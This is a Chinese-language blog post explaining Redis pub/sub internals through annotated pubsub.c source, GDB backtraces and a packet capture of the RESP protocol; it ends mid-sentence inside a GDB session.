<h3 id="退订频道-——-USUBSCRIBE命令的实现"><a href="#退订频道-——-USUBSCRIBE命令的实现" class="headerlink" title="退订频道 —— USUBSCRIBE命令的实现"></a>退订频道 —— USUBSCRIBE命令的实现<span id="jump2"></span></h3><p>Redis服务器收到客户端的退订频道请求后，通过修改字典<code>pubsub_channels</code>，解除客户端与频道之间的订阅关系，具体操作如下：</p>
<ul>
<li>如果<code>pubsub_channel</code>字典包含<code>channel</code>这个键，说明<font color = 'blue'>此时这个频道已经有1个或多个订阅者</font>：<ul>
<li>如果频道有多于1个的订阅者，Redis服务器会查询<code>pubsub_channels</code>字典，找到频道对应的客户端链表，然后从链表中删除这个客户端。</li>
<li>如果频道只有1个订阅者，Redis服务器将对应的客户端链表变成空链表，并且从<code>pubsub_channels</code>字典中删除这个频道对应的键。</li>
</ul>
</li>
<li>如果<code>pubsub_channel</code>字典不包含<code>channel</code>这个键，说明没有客户端订阅这个频道，此时Redis服务器不对<code>pubsub_channels</code>字典做任何修改，只是简单向客户端发送回复。（回复内容包括三部分：”unsubscribe”, “channel”, 这个客户端订阅的频道个数和模式个数之和）</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中client1, client2订阅<code>channel1</code>, client3, client4订阅<code>channel2</code>。</p>
<p>假设client2执行<code>unsubscribe channel1</code>，client3, client4分别执行<code>unsubscribe channel2</code>，那么退订前后的<code>pubsub_channels</code>字典变化如下所示：<br><img src="/2022/01/29/2022-01-29-redis-pubsub-study/image2.png"></p>
<p>退订频道的源码实现参考<code>pubsub.c/unsubscribeCommand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unsubscribeCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;argc == <span class="number">1</span>) &#123;</span><br><span class="line">        pubsubUnsubscribeAllChannels(c,<span class="number">1</span>);				<span class="comment">// unsubscribe不加任何参数，表示解除所有频道的订阅</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++)</span><br><span class="line">            pubsubUnsubscribeChannel(c,c-&gt;argv[j],<span class="number">1</span>);	<span class="comment">// 解除这个客户端与某个频道的订阅关系</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientSubscriptionsCount(c) == <span class="number">0</span>) c-&gt;flags &amp;= ~CLIENT_PUBSUB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unsubscribe a client from a channel. Returns 1 if the operation succeeded, or</span></span><br><span class="line"><span class="comment"> * 0 if the client was not subscribed to the specified channel. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubUnsubscribeChannel</span><span class="params">(client *c, robj *channel, <span class="type">int</span> notify)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients;</span><br><span class="line">    listNode *ln;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Remove the channel from the client -&gt; channels hash table */</span></span><br><span class="line">    incrRefCount(channel);</span><br><span class="line">    <span class="keyword">if</span> (dictDelete(c-&gt;pubsub_channels,channel) == DICT_OK) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/* Remove the client from the channel -&gt; clients list hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_channels,channel);</span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,de != <span class="literal">NULL</span>);</span><br><span class="line">        clients = dictGetVal(de);					<span class="comment">// 1、查询pubsub_channels字典，找到频道对应的客户端链表clients</span></span><br><span class="line">        ln = listSearchKey(clients,c);				<span class="comment">// 2、在链表clients中查找客户端c</span></span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,ln != <span class="literal">NULL</span>);</span><br><span class="line">        listDelNode(clients,ln);					<span class="comment">// 3、然后从链表中删除这个客户端c</span></span><br><span class="line">        <span class="keyword">if</span> (listLength(clients) == <span class="number">0</span>) &#123;				<span class="comment">// 4、如果频道只有1个订阅者，还需要从pubsub_channels字典中删除这个频道对应的键</span></span><br><span class="line">            dictDelete(server.pubsub_channels,channel);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    <span class="keyword">if</span> (notify) addReplyPubsubUnsubscribed(c,channel);</span><br><span class="line">    decrRefCount(channel); <span class="comment">/* it is finally safe to release it */</span></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="订阅模式-——-PSUBSCRIBE命令的实现"><a href="#订阅模式-——-PSUBSCRIBE命令的实现" class="headerlink" title="订阅模式 —— PSUBSCRIBE命令的实现"></a>订阅模式 —— PSUBSCRIBE命令的实现<span id="jump3"></span></h3><p>Redis服务器将所有模式订阅信息记录在链表<code>pubsub_patterns</code>和字典<code>pubsub_pattern_dict</code>，相关数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> <span class="title">server</span>;</span>	<span class="comment">/* Server global state, server.c */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">    <span class="built_in">list</span> *pubsub_patterns;  <span class="comment">/* A list of pubsub_patterns */</span></span><br><span class="line">    dict *pubsub_patterns_dict;  <span class="comment">/* A dict of pubsub_patterns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>1、<code>pubsub_patterns</code>链表节点的类型为<code>struct pubsubPattern</code>，其中<code>pattern</code>成员表示订阅的模式串，<code>client</code>成员记录订阅该模式的客户端。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pubsubPattern</span> &#123;</span></span><br><span class="line">    client *client;			<span class="comment">// 记录订阅该模式的客户端</span></span><br><span class="line">    robj *pattern;			<span class="comment">// 表示订阅的模式串</span></span><br><span class="line">&#125; pubsubPattern;</span><br></pre></td></tr></table></figure>

<p>2、<code>pubsub_patterns_dict</code>字典的键为被订阅的模式（<code>robj *</code>类型），字典的值为链表，这个链表记录所有订阅了这个模式的客户端 。</p>
<p>当客户端执行PSUBSCRIBE命令后，Redis服务器会收到这个模式订阅请求，并执行如下操作：</p>
<ul>
<li>创建一个<code>struct pubsubPattern</code>结构，其中<code>pattern</code>成员设置为被订阅的模式，<code>client</code>成员设置为订阅该模式的客户端</li>
<li>将<code>struct pubsubPattern</code>结构加入到<code>pubsub_patterns</code>链表的末尾。</li>
<li>然后在<code>pubsub_patterns_dict</code>字典中查找这个模式：<ul>
<li>如果没查到，说明这个模式还没有任何客户端订阅。此时Redis在<code>pubsub_patterns_dict</code>字典中为这个模式创建一个键，将这个键的值设为空链表，再将客户端加入链表。</li>
<li>如果能查到，说明这个模式已有客户端订阅，<code>pubsub_patterns_dict</code>字典中必有对应的客户端链表，此时Redis只需将客户端添加到这个客户端链表的末尾即可。</li>
</ul>
</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中：</p>
<ul>
<li>client1订阅模式pat1*</li>
<li>client2订阅模式pat2*</li>
<li>client3, client4订阅模式pat3*。</li>
</ul>
<p>此时<code>pubsub_patterns_dict</code>字典和<code>pubsub_patterns</code>链表如下图所示：</p>
<p><img src="/2022/01/29/2022-01-29-redis-pubsub-study/image3.png"></p>
<h5 id="GDB打印模式字典和模式链表的方法"><a href="#GDB打印模式字典和模式链表的方法" class="headerlink" title="GDB打印模式字典和模式链表的方法"></a><a href="#jumpy">GDB打印模式字典和模式链表的方法</a></h5><p>订阅模式的源码参考<code>pubsub.c/pubsubSubscribePattern</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Subscribe a client to a pattern. Returns 1 if the operation succeeded, or 0 if the client was already subscribed to that pattern. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubSubscribePattern</span><span class="params">(client *c, robj *pattern)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listSearchKey(c-&gt;pubsub_patterns,pattern) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        pubsubPattern *pat;</span><br><span class="line">        listAddNodeTail(c-&gt;pubsub_patterns,pattern);</span><br><span class="line">        incrRefCount(pattern);</span><br><span class="line">        pat = zmalloc(<span class="keyword">sizeof</span>(*pat));					<span class="comment">// 1、构造一个pubsubPattern结构</span></span><br><span class="line">        pat-&gt;pattern = getDecodedObject(pattern);		<span class="comment">// 2、pattern成员设置为被订阅的模式</span></span><br><span class="line">        pat-&gt;client = c;								<span class="comment">// 3、client成员设置为订阅这个模式的客户端</span></span><br><span class="line">        listAddNodeTail(server.pubsub_patterns,pat);	<span class="comment">// 4、添加这个pubsubPatern结构到pubsub_patterns链表尾</span></span><br><span class="line">        <span class="comment">/* Add the client to the pattern -&gt; list of clients hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_patterns_dict,pattern);</span><br><span class="line">        <span class="keyword">if</span> (de == <span class="literal">NULL</span>) &#123;	<span class="comment">// 如果没查到，说明这个模式还没有客户端订阅，此时先在字典中为这个模式创建一个键，键的值为空链表</span></span><br><span class="line">            clients = listCreate();</span><br><span class="line">            dictAdd(server.pubsub_patterns_dict,pattern,clients);</span><br><span class="line">            incrRefCount(pattern);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clients = dictGetVal(de);</span><br><span class="line">        &#125;</span><br><span class="line">        listAddNodeTail(clients,c);	<span class="comment">// 将客户端c加入链表clients</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    addReplyPubsubPatSubscribed(c,pattern);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="退订模式-——-PUNSUBSCRIBE命令的实现"><a href="#退订模式-——-PUNSUBSCRIBE命令的实现" class="headerlink" title="退订模式 —— PUNSUBSCRIBE命令的实现"></a>退订模式 —— PUNSUBSCRIBE命令的实现<span id="jump4"></span></h3><p>模式退订操作和模式订阅的操作正好相反，当客户端执行PUNSUBSCRIBE命令退订一个模式时，Redis服务器将发生如下操作：</p>
<ul>
<li>在<code>pubsub_patterns</code>链表中查找这个客户端并删除。</li>
<li>在<code>pubsub_patterns_dict</code>字典中，找到这个模式对应的客户端链表，在链表中查找这个客户端并删除。</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中：</p>
<ul>
<li>client1订阅了模式pat1*</li>
<li>client2订阅了模式pat2*</li>
<li>client3, client4订阅了模式pat3*。</li>
</ul>
<p>假设此时client2执行<code>unpsubscribe pat2*</code>，client4执行<code>unsubscribe pat3*</code>，那么模式退订前后的<code>pubsub_patterns</code>链表和<code>pubsub_patterns_dict</code>字典变化如下图所示：<br>[O<br><img src="/2022/01/29/2022-01-29-redis-pubsub-study/image4.png"></p>
<p>模式退订的源码参考<code>pubsub.c/punsubscribeCommand</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">punsubscribeCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;argc == <span class="number">1</span>) &#123;</span><br><span class="line">        pubsubUnsubscribeAllPatterns(c,<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++)</span><br><span class="line">            pubsubUnsubscribePattern(c,c-&gt;argv[j],<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientSubscriptionsCount(c) == <span class="number">0</span>) c-&gt;flags &amp;= ~CLIENT_PUBSUB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubUnsubscribePattern</span><span class="params">(client *c, robj *pattern, <span class="type">int</span> notify)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients;</span><br><span class="line">    listNode *ln;</span><br><span class="line">    pubsubPattern pat;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    incrRefCount(pattern); <span class="comment">/* Protect the object. May be the same we remove */</span></span><br><span class="line">    <span class="keyword">if</span> ((ln = listSearchKey(c-&gt;pubsub_patterns,pattern)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        listDelNode(c-&gt;pubsub_patterns,ln);</span><br><span class="line">        pat.client = c;</span><br><span class="line">        pat.pattern = pattern;</span><br><span class="line">        ln = listSearchKey(server.pubsub_patterns,&amp;pat);</span><br><span class="line">        listDelNode(server.pubsub_patterns,ln);			<span class="comment">// 在pubsub_patterns链表中查找这个客户端并删除。</span></span><br><span class="line">        <span class="comment">/* Remove the client from the pattern -&gt; clients list hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_patterns_dict,pattern);</span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,de != <span class="literal">NULL</span>);</span><br><span class="line">        clients = dictGetVal(de);</span><br><span class="line">        ln = listSearchKey(clients,c);	<span class="comment">// 查找pubsub_patterns_dict字典，找到客户端链表，在链表中删除这个客户端节点</span></span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,ln != <span class="literal">NULL</span>);</span><br><span class="line">        listDelNode(clients,ln);</span><br><span class="line">        <span class="keyword">if</span> (listLength(clients) == <span class="number">0</span>) &#123;	<span class="comment">// 如果删除节点后的链表长度为0，把键pattern也从字典中删除。</span></span><br><span class="line">            <span class="comment">/* Free the list and associated hash entry at all if this was</span></span><br><span class="line"><span class="comment">             * the latest client. */</span></span><br><span class="line">            dictDelete(server.pubsub_patterns_dict,pattern);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    <span class="keyword">if</span> (notify) addReplyPubsubPatUnsubscribed(c,pattern);</span><br><span class="line">    decrRefCount(pattern);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="发送消息-——-PUBLISH命令的实现"><a href="#发送消息-——-PUBLISH命令的实现" class="headerlink" title="发送消息 —— PUBLISH命令的实现"></a>发送消息 —— PUBLISH命令的实现<span id="jump5"></span></h3><p>客户端执行<code>PUBLISH channel message</code>命令时，Redis服务器将执行如下两个重要操作：</p>
<ul>
<li>首先，查找<code>pubsub_channels</code>字典，将消息发送给这个频道的所有订阅者。</li>
<li>其次，查找<code>pubsub_patterns_dict</code>字典，找出所有匹配这个频道的模式，再将消息发送给这些模式的订阅者。</li>
</ul>
<p>发布消息的源码实现参考<code>publishCommand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">publishCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> receivers = pubsubPublishMessage(c-&gt;argv[<span class="number">1</span>],c-&gt;argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (server.cluster_enabled)</span><br><span class="line">        clusterPropagatePublish(c-&gt;argv[<span class="number">1</span>],c-&gt;argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        forceCommandPropagation(c,PROPAGATE_REPL);</span><br><span class="line">    addReplyLongLong(c,receivers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubPublishMessage</span><span class="params">(robj *channel, robj *message)</span> &#123;</span><br><span class="line">    <span class="type">int</span> receivers = <span class="number">0</span>;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    dictIterator *di;</span><br><span class="line">    listNode *ln;</span><br><span class="line">    listIter li;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1、先查找频道字典`pubsub_channels` ，将消息发送给这个频道的所有订阅者</span></span><br><span class="line">    de = dictFind(server.pubsub_channels,channel);</span><br><span class="line">    <span class="keyword">if</span> (de) &#123;</span><br><span class="line">        <span class="built_in">list</span> *<span class="built_in">list</span> = dictGetVal(de);</span><br><span class="line">        listNode *ln;</span><br><span class="line">        listIter li;</span><br><span class="line"></span><br><span class="line">        listRewind(<span class="built_in">list</span>,&amp;li);</span><br><span class="line">        <span class="keyword">while</span> ((ln = listNext(&amp;li)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            client *c = ln-&gt;value;</span><br><span class="line">            addReplyPubsubMessage(c,channel,message);	<span class="comment">// 将消息发送给这个频道的所有订阅者</span></span><br><span class="line">            receivers++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2、再查找模式字典pubsub_patterns_dict, 找出所有匹配这个channel的模式，将消息发送给这些模式的所有订阅者</span></span><br><span class="line">    di = dictGetIterator(server.pubsub_patterns_dict);</span><br><span class="line">    <span class="keyword">if</span> (di) &#123;</span><br><span class="line">        channel = getDecodedObject(channel);</span><br><span class="line">        <span class="keyword">while</span>((de = dictNext(di)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            robj *pattern = dictGetKey(de);</span><br><span class="line">            <span class="built_in">list</span> *clients = dictGetVal(de);</span><br><span class="line">            <span class="keyword">if</span> (!stringmatchlen((<span class="type">char</span>*)pattern-&gt;ptr,	<span class="comment">// 判断模式是否与频道channel匹配</span></span><br><span class="line">                                sdslen(pattern-&gt;ptr),</span><br><span class="line">                                (<span class="type">char</span>*)channel-&gt;ptr,</span><br><span class="line">                                sdslen(channel-&gt;ptr),<span class="number">0</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历这个模式的客户端链表，将消息发送到所有订阅这个模式的客户端。</span></span><br><span class="line">            listRewind(clients,&amp;li);</span><br><span class="line">            <span class="keyword">while</span> ((ln = listNext(&amp;li)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                client *c = listNodeValue(ln);</span><br><span class="line">                addReplyPubsubPatMessage(c,pattern,channel,message);</span><br><span class="line">                receivers++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        decrRefCount(channel);</span><br><span class="line">        dictReleaseIterator(di);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> receivers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合源码，可以看出<strong>Redis发布订阅的特点</strong>：<span id="jump6"></span></p>
<ul>
<li><p>发布的消息不保留在内存。也就是说，必须先有订阅者，发布者发送的消息才有意义。</p>
</li>
<li><p>订阅的模式名称支持<code>glob</code>风格的匹配符，示例参考：<a href="https://blog.huangz.me/diary/2013/redis-pubsub-glob-pattern-example.html">Redis 发布与订阅模式匹配符示例</a></p>
</li>
</ul>
<h4 id="为什么设计pubsub-patterns-dict字典，有什么好处？"><a href="#为什么设计pubsub-patterns-dict字典，有什么好处？" class="headerlink" title="为什么设计pubsub_patterns_dict字典，有什么好处？"></a>为什么设计pubsub_patterns_dict字典，有什么好处？<span id="jump7"></span></h4><p>假设有N个客户端, 每个客户端订阅了1个模式；如果只使用链表，判断所有模式是否与指定频道匹配的次数固定为N次，效率较低。</p>
<p>由于实际场景中，<font color = 'blue'>存在同一个模式被多个客户端订阅的场景</font>，所以设计<code>pubsub_patterns_dict</code>字典的好处在于，将这个判断次数从N次降低为最多N次，提高效率。</p>
<h3 id="一次完整的Redis订阅、发布流程分析"><a href="#一次完整的Redis订阅、发布流程分析" class="headerlink" title="一次完整的Redis订阅、发布流程分析"></a>一次完整的Redis订阅、发布流程分析<span id="jump10"></span></h3><p>假设有1个频道订阅者和1个消息发布者，一次完整的Redis订阅、发布流程如下图所示：<br><img src="/2022/01/29/2022-01-29-redis-pubsub-study/image5.png"></p>
<h4 id="为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？"><a href="#为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？" class="headerlink" title="为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？"></a>为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？<span id="jump11"></span></h4><p>观察流程图中的第5步，订阅者成功建立长连接后，会进入while死循环，每次循环调用函数<code>cliReadReply</code>读取一条频道的消息，所以无法再执行<code>unsubscribe</code>命令。redis-cli的调用栈参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00007ffff7e5d5b0</span> in __libc_recv (fd=<span class="number">3</span>, buf=<span class="number">0x7fffffffa200</span>, len=<span class="number">16384</span>, flags=flags@entry=<span class="number">0</span>) at ../sysdeps/unix/sysv/linux/recv.c:<span class="number">28</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x000055555558ec0b</span> in <span class="title function_">recv</span> <span class="params">(__flags=<span class="number">0</span>, __n=&lt;optimized out&gt;, __buf=&lt;optimized out&gt;, __fd=&lt;optimized out&gt;)</span></span><br><span class="line">    at /usr/include/x86_64-linux-gnu/bits/socket2.h:44</span><br><span class="line">#2  <span class="title function_">redisNetRead</span> <span class="params">(c=<span class="number">0x555555841300</span>, buf=&lt;optimized out&gt;, bufcap=&lt;optimized out&gt;)</span> at net.c:61</span><br><span class="line">#3  0x0000555555587702 in <span class="title function_">redisBufferRead</span> <span class="params">(c=<span class="number">0x555555841300</span>)</span> at hiredis.c:881</span><br><span class="line">#4  0x0000555555587a92 in <span class="title function_">main</span> <span class="params">(c=<span class="number">0x555555841300</span>, reply=<span class="number">0x7fffffffe280</span>)</span> at hiredis.c:954</span><br><span class="line">#5  0x000055555557fadd in <span class="title function_">cliReadReply</span> <span class="params">(output_raw_strings=<span class="number">0</span>)</span> at redis-cli.c:1204</span><br><span class="line">#6  0x0000555555581e0d in <span class="title function_">cliSendCommand</span> <span class="params">(argc=<span class="number">2</span>, argv=<span class="number">0x7ffff780a000</span>, repeat=<span class="number">0</span>)</span> at redis-cli.c:1361</span><br><span class="line">#7  0x0000555555582006 in <span class="title function_">issueCommandRepeat</span> <span class="params">(argc=<span class="number">2</span>, argv=<span class="number">0x7ffff780a000</span>, repeat=<span class="number">1</span>)</span> at redis-cli.c:1858</span><br><span class="line">#8  0x000055555556dd8d in <span class="title function_">issueCommand</span> <span class="params">(argv=<span class="number">0x7ffff780a000</span>, argc=&lt;optimized out&gt;)</span> at redis-cli.c:2090</span><br><span class="line">#9  <span class="title function_">noninteractive</span> <span class="params">(argv=<span class="number">0x7ffff780a000</span>, argc=&lt;optimized out&gt;)</span> at redis-cli.c:2090</span><br><span class="line">#10 <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;)</span> at redis-cli.c:8251</span><br></pre></td></tr></table></figure>



<h4 id="TCP是没有消息边界的，订阅者是如何保证正确解析发布者的消息"><a href="#TCP是没有消息边界的，订阅者是如何保证正确解析发布者的消息" class="headerlink" title="TCP是没有消息边界的，订阅者是如何保证正确解析发布者的消息?"></a><a href="#jump12">TCP是没有消息边界的，订阅者是如何保证正确解析发布者的消息?</a><span id="jump12"></span></h4><p>考虑如下场景，发布者依次发布两条消息到服务端，假设消息内容分别为”hello” “world”。由于TCP协议是没有消息边界的，如果客户端仅通过循环调用<code>read()</code>的方式读取消息，可能会发生如下不符合预期的情况：</p>
<ul>
<li><code>read</code>只调用了1次，返回的是”helloworld”</li>
<li><code>read</code>调用了2次，但返回的是”hell” “oworld”，或者”hellowor” “ld”，等等。</li>
<li><code>read</code>调用了3次，依次返回”hell”, “owo”, “rld”</li>
<li>……</li>
</ul>
<p>针对以上的TCP无消息边界问题，一般有如下3种常见的解决策略：</p>
<ul>
<li>每次只发送固定长度的消息</li>
<li>把消息的大小和内容一并发送</li>
<li>使用特殊标记划分消息边界</li>
</ul>
<p>其中，Redis采用第三种策略，即通过自定义RESP协议的方式，使用CRLF(<code>\r\n</code>)作为消息边界。</p>
<p>比如服务器向客户端回复消息”subscribe channel1 1”，对应的TCP报文内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15:36:47.498803 IP localhost.6379 &gt; localhost.50208: Flags [P.], seq 1:38, ack 34, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 37: RESP &quot;subscribe&quot; &quot;channel1&quot; &quot;1&quot;</span><br><span class="line">        0x0000:  4500 0059 d241 4000 4006 6a5b 7f00 0001  E..Y.A@.@.j[....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd66 c0c1 f5d6  .........z.f....</span><br><span class="line">        0x0020:  8018 0200 fe4d 0000 0101 080a dcdf ed32  .....M.........2</span><br><span class="line">        0x0030:  dcdf ed32 2a33 0d0a 2439 0d0a 7375 6273  ...2*3..$9..subs</span><br><span class="line">        0x0040:  6372 6962 650d 0a24 380d 0a63 6861 6e6e  cribe..$8..chann</span><br><span class="line">        0x0050:  656c 310d 0a3a 310d 0a                   el1..:1..</span><br></pre></td></tr></table></figure>
<h5 id="附：一次订阅中的连接建立，请求消息的过程抓包结果"><a href="#附：一次订阅中的连接建立，请求消息的过程抓包结果" class="headerlink" title="附：一次订阅中的连接建立，请求消息的过程抓包结果"></a><a href="#jumpz">附：一次订阅中的连接建立，请求消息的过程抓包结果</a></h5><p>可以看出，”subscribe channel1 1”命令在TCP报文中存储的协议内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*3\r\n$9\r\nsubscribe\r\n$8\r\nchannel1\r\n:1</span><br></pre></td></tr></table></figure>

<p>协议内容的解析参考<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a> ， 以下只做简单的解释：</p>
<ul>
<li>*3 表示数组长度为3， 数组元素依次为 [“subscribe” channel1” “1”]</li>
<li>$9 表示字符串 “subscribe” 的长度</li>
<li>$8表示字符串 “channel1” 的长度</li>
<li>：表示类型为整数，:1表示第三个元素为整数，取值为1</li>
</ul>
<p>另外，客户端程序redis-cli中，通过封装函数<code>redisGetReply</code>获取一次完整的消息，而不是简单地循环调用read()，从而确保正确地解析服务器发送的消息。</p>
<h4 id="订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？"><a href="#订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？" class="headerlink" title="订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？"></a>订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？<span id="jump8"></span></h4><p>假设1个客户端通过<code>redis-cli</code>订阅频道<code>channel1</code>之后，按下了Ctrl+C退出，此时服务器将依次发生如下操作：</p>
<ul>
<li>1、首先通过I&#x2F;O多路复用器(<code>select</code>&#x2F;<code>poll</code>&#x2F;<code>epoll</code>)监听这个客户端套接字的可读事件，触发命令请求处理的回调函数<code>readQueryFromClient</code>。调用链<code>aeMain -&gt; aeProcessEvents -&gt; readQueryFromClient -&gt; read</code>，调用栈参考：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt <span class="comment">// 1、首先通过I/O多路复用器监听这个客户端套接字的可读事件，触发命令请求处理的回调函数readQueryFromClient</span></span><br><span class="line">#<span class="number">0</span>  connSocketRead (conn=<span class="number">0x7fcbeae150c0</span>, buf=<span class="number">0x7fcbeae7cfc5</span>, buf_len=<span class="number">16384</span>) at connection.c:<span class="number">182</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x000056041195df03</span> in <span class="title function_">connRead</span> <span class="params">(buf_len=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, conn=&lt;optimized out&gt;)</span> at connection.h:152</span><br><span class="line">#2  <span class="title function_">readQueryFromClient</span> <span class="params">(conn=<span class="number">0x7fcbeae150c0</span>)</span> at networking.c:2026</span><br><span class="line">#3  0x00005604119e3e3c in <span class="title function_">callHandler</span> <span class="params">(handler=&lt;optimized out&gt;, conn=<span class="number">0x7fcbeae150c0</span>)</span> at connhelpers.h:79</span><br><span class="line">#4  <span class="title function_">connSocketEventHandler</span> <span class="params">(el=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, clientData=<span class="number">0x7fcbeae150c0</span>, mask=&lt;optimized out&gt;)</span> at connection.c:296</span><br><span class="line">#5  0x0000560411942723 in <span class="title function_">aeProcessEvents</span> <span class="params">(eventLoop=eventLoop@entry=<span class="number">0x7fcbeae0b480</span>, flags=flags@entry=<span class="number">27</span>)</span> at ae.c:479</span><br><span class="line">#6  0x0000560411942a5d in <span class="title function_">aeMain</span> <span class="params">(eventLoop=<span class="number">0x7fcbeae0b480</span>)</span> at ae.c:539</span><br><span class="line">#7  0x000056041193eed8 in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=<span class="number">0x7ffc77472d58</span>)</span> at server.c:5498</span><br><span class="line"><span class="params">(gdb)</span> n</span><br><span class="line">	<span class="type">int</span> ret = read(conn-&gt;fd, buf, buf_len); <span class="comment">// 